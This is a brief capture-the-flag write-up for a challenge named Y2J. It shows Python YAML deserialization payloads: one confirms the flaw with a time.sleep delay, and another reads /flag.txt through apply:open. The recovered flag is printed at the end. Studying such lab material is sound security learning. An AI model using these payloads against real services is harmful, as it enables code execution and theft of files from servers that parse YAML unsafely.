### Challenge description

Everyone was so worried about Y2K, but apparently it was a typo all along!!

The real world-ending fears were from Y2J!

Find the `flag.txt` file in the root of the filesystem.

### Solution

Its yaml in a text box. We see the server is a python server so we can try yaml deserialization attack on it with this payload, if it waits 3s before responding, we just have to craft the right payload to get the flag

```yaml
!!python/object/apply:time.sleep [3]
```

it waits 3s! okey, now to get the flag:
```yaml
!!python/object/new:tuple
 - !!python/object/apply:open ["/flag.txt"]
 ```

 flag{b20870a1955ac22377045e3b2dcb832a}